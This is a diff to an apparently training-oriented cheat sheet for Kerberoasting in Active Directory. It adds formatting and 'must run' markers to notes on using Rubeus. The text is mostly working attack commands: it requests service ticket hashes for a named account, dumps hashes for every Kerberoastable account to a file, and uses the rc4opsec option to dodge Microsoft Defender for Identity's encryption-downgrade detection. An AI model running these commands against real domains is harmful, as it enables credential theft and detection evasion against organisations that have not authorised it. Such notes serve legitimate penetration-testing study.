@@ -38,31 +38,36 @@ Get-DomainUser -SPN
 - Use Rubeus to list Kerberoast stats
 
 
-```
+```powershell
 Rubeus.exe kerberoast /stats
 ```
 
 
-- Use Rubeus to request a TGS
+- Use Rubeus to request a TGS (This is a must run)
 
 
+```powershell
+Rubeus.exe kerberoast /user:svcadmin /simple 
 ```
-Rubeus.exe kerberoast /user:svcadmin /simple
-```
 
 
-- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
+- To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC (Also must run)
 
-```
+```powershell
 Rubeus.exe kerberoast /stats /rc4opsec
 Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
 ```
 
 - Kerberoast all possible accounts
 
-```
+```powershell
 Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 ```
 
 
-> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable 
+> **Note -:** You don't need invisi-shell while running `rubeus` here, it won't be stable, also the options with **must run**, must be ran as one might provide an hash and the other might not, depending on system configuration
+
+
+
+
+
